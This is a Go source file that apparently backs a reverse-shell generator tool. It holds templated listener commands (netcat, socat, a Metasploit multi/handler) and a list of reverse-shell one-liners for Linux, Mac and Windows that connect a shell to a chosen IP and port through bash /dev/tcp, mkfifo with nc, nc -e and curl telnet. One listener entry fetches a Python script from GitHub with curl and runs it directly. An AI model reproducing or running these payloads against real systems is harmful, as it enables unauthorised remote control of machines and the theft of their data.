package data

type Listener struct {
	Name    string
	Payload string
}

type ReverseShellCommand struct {
	Name    string
	Command string
	Meta    []string
}

var OSTypes = []string{
	"All",
	"Linux",
	"Windows",
	"Mac",
}

var Listeners = []Listener{
	{`nc`, `nc -lvnp {{.Port}}`},
	{`nc freebsd`, `nc -lvn {{.Port}}`},
	{`busybox nc`, `busybox nc -lp {{.Port}}`},
	{`ncat`, `ncat -lvnp {{.Port}}`},
	{`ncat.exe`, `ncat.exe -lvnp {{.Port}}`},
	{`ncat (TLS)`, `ncat --ssl -lvnp {{.Port}}`},
	{`rlwrap + nc`, `rlwrap -cAr nc -lvnp {{.Port}}`},
	{`rustcat`, `rcat listen {{.Port}}`},
	{`openssl`, `openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 30 -nodes; openssl s_server -quiet -key key.pem -cert cert.pem -port {{.Port}}`},
	{`pwncat`, `python3 -m pwncat -lp {{.Port}}`},
	{`pwncat (windows)`, `python3 -m pwncat -m windows -lp {{.Port}}`},
	{`windows ConPty`, `stty raw -echo; (stty size; cat) | nc -lvnp {{.Port}}`},
	{`socat`, `socat -d -d TCP-LISTEN:{{.Port}} STDOUT`},
	{`socat (TTY)`, `socat -d -d file:` + "`tty`" + `,raw,echo=0 TCP-LISTEN:{{.Port}}`},
	{`powercat`, `powercat -l -p {{.Port}}`},
	// FIXME: Payload for msfvenom is acquired from the MSFVenom tab. Fix this after implementing that part.
	{`msfconsole`, `msfconsole -q -x "use multi/handler; set payload {{.Payload}}; set lhost {{.Ip}}; set lport {{.Port}}; exploit"`},
	{`hoaxshell`, `python3 -c "$(curl -s https://raw.githubusercontent.com/t3l3machus/hoaxshell/main/revshells/hoaxshell-listener.py)" -t {type} -p {{.Port}}`},
}

// TODO: Complete the list
var ReverseShellCommands = []ReverseShellCommand{
	{
		"Bash -i",
		"{shell} -i >& /dev/tcp/{ip}/{port} 0>&1",
		[]string{"linux", "mac"},
	},
	{
		"Bash 196",
		"0<&196;exec 196<>/dev/tcp/{ip}/{port}; {shell} <&196 >&196 2>&196",
		[]string{"linux", "mac"},
	},
	{
		"Bash read line",
		"exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done",
		[]string{"linux", "mac"},
	},
	{
		"Bash 5",
		"{shell} -i 5<> /dev/tcp/{ip}/{port} 0<&5 1>&5 2>&5",
		[]string{"linux", "mac"},
	},
	{
		"Bash udp",
		"{shell} -i >& /dev/udp/{ip}/{port} 0>&1",
		[]string{"linux", "mac"},
	},
	{
		"nc mkfifo",
		"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{shell} -i 2>&1|nc {ip} {port} >/tmp/f",
		[]string{"linux", "mac"},
	},
	{
		"nc -e",
		"nc {ip} {port} -e {shell}",
		[]string{"linux", "mac"},
	},
	{
		"nc.exe -e",
		"nc.exe {ip} {port} -e {shell}",
		[]string{"windows"},
	},
	{
		"BusyBox nc -e",
		"busybox nc {ip} {port} -e {shell}",
		[]string{"linux"},
	},
	{
		"nc -c",
		"nc -c {shell} {ip} {port}",
		[]string{"linux", "mac"},
	},
	{
		"ncat -e",
		"ncat {ip} {port} -e {shell}",
		[]string{"linux", "mac"},
	},
	{
		"ncat.exe -e",
		"ncat.exe {ip} {port} -e {shell}",
		[]string{"windows"},
	},
	{
		"ncat udp",
		"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{shell} -i 2>&1|ncat -u {ip} {port} >/tmp/f",
		[]string{"linux", "mac"},
	},
	{
		"curl",
		"C='curl -Ns telnet://{ip}:{port}'; $C </dev/null 2>&1 | {shell} 2>&1 | $C >/dev/null",
		[]string{"linux", "mac"},
	},
	{
		"rustcat",
		"rcat connect -s {shell} {ip} {port}",
		[]string{"linux", "mac"},
	},
}
